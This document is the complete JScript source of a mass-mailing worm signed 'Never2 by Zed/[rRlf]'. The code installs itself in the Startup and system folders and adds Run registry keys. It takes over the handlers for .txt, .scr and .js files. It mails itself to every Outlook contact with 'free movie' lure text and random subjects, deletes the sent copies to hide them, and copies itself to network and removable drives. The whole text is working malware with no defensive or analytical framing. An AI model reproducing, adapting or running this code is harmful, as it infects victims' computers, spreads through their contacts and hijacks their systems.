   // JavaScript/Never2 by Zed/[rRlf]
   {
   var fso=WScript.CreateObject("Scripting.FileSystemObject")
   var wsc=WScript.CreateObject("WScript.Shell");
   var G=fso.GetFile(WScript.ScriptFullName)
   var otf=fso.OpenTextFile(WScript.ScriptFullName,1);
   ra=otf.ReadAll();
   otf.Close();
   var RegKeys=new Array("Run","RunServices")
   var RndReg=RegKeys[Math.round(Math.random()*1)];
   var R="CmdWsh32"
   var WriteStartup=fso.CreateTextFile(wsc.SpecialFolders("Startup")+"\\StartUp.js",true);
   WriteStartup.Write (ra);
   WriteStartup.Close();
   var WriteBoot=fso.CreateTextFile(fso.GetSpecialFolder(1)+"\\CmdWsh32.js",true);
   WriteBoot.Write (ra);
   WriteBoot.Close();
   WriteString ("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\"+RndReg+"\\JSCmd32","Wscript.exe "+fso.GetSpecialFolder(1)+"\\CmdWsh32.js %1")
   WriteString ("HKCU\\Software\\Never\\","Never2 by Zed/[rRlf]")
   WriteString ("HKCR\\txtfile\\shell\\open\\command\\","Wscript.exe "+fso.GetSpecialFolder(1)+"\\CmdWsh32.js %1")
   WriteString ("HKLM\\Software\\Classes\\scrfile\\shell\\open\\command\\","Wscript.exe "+fso.GetSpecialFolder(1)+"\\CmdWsh32.js %1")
   WriteString ("HKLM\\Software\\Classes\\JSFile\\shell\\open\\command\\","Wscript.exe "+fso.GetSpecialFolder(1)+"\\CmdWsh32.js %1")
   var F1="Free_movie.js"
   var F2="Fwd_movie.js"
   var F3="Movie_Sites.js"
   var F4="Movie_Web.js"
   var F5="Movie_List.js"
   var F6="Movie_Pages.js"
   var F7="Web_Movie.js"
   var F8="Movie-Sites.js"
   var F9="Fwd-Movie.js"
   var F10="Movie-Fwd.js"
   var F11="Fwd-Sites.js"
   var EmailAttachment=new Array(F1,F2,F3,F4,F5,F6,F7,F8,F9,F10,F11)
   var RndEmalAttachment=EmailAttachment[Math.round(Math.random()*10)];
   var WriteCode=fso.CreateTextFile(fso.GetSpecialFolder(1)+"\\"+RndEmalAttachment,true);
   WriteCode.Write (ra);
   WriteCode.Close();
   {var OutlookApp=WScript.CreateObject("Outlook.Application");
   var GNS=OutlookApp.GetNamespace("MAPI");
   var e1=("Cheers!\n\n");
   e1=e1+("Check out this great list of movie sites that I included in the attachments!\n");
   e1=e1+("I can get any Movie file that I want from these sites, and its free!\n");
   e1=e1+("And please don't be greedy! forward this email to all the people that\n");
   e1=e1+("you consider friends, and Let them benefit from these Movie sites aswell!\n");
   e1=e1+("\n\n");
   e1=e1+("bye!");
   for(CountLoop=1; CountLoop <= GNS.AddressLists.Count; CountLoop++)
   {for(ListContacts = 1; ListContacts <= GNS.AddressLists(CountLoop).AddressEntries.Count; ListContacts++){
   var EmailUsers = GNS.AddressLists(CountLoop).AddressEntries(ListContacts)
   var C1="Hello "+EmailUsers+"!"
   var C2="Hey "+EmailUsers+"!"
   var C3="Fwd: Hey You!"
   var C4="Fwd: Check this!"
   var C5="Fwd: Just Look"
   var C6="Fwd: Take a look!"
   var C7=EmailUsers+"!"
   var C8="Fwd: Loop at this!"
   var C9="Fwd: Check this out!"
   var C10="Fwd: It's Free!"
   var C11="Fwd: Look!"
   var C12="Fwd: Free Movie!"
   var C13="Fwd: Here you go!"
   var C14="Fwd: Have a look!"
   var C15="Look "+EmailUsers+"!"
   var C16="Fwd: Read This!"
   var EmailSubject=new Array(C1,C2,C3,C4,C5,C6,C7,C8,C9,C10,C11,C12,C13,C14,C15,C16);
   var RndEmailSubject=EmailSubject[Math.round(Math.random()*15)];
   var OutlookEmail=OutlookApp.CreateItem(0);
   OutlookEmail.Subject=(RndEmailSubject)
   OutlookEmail.Body=(e1)
   OutlookEmail.Attachments.Add(fso.GetSpecialFolder(1)+"\\"+RndEmalAttachment);
   OutlookEmail.Recipients.Add(EmailUsers);
   OutlookEmail.DeleteAfterSubmit=1
   OutlookEmail.Send
   }}}
   var e=new Enumerator(fso.Drives);
   for (; !e.atEnd(); e.moveNext())
   {
   var x=e.item();
   if ((x.DriveType == 2) || (x.DriveType == 3))
   if (x.Path.toUpperCase() != "C:")
   G.Copy (x.Path+"\\Movie.js",true)
   }}
   function WriteString(RegistryKey,RegistryValue){
   wsc.RegWrite (RegistryKey,RegistryValue);
   }
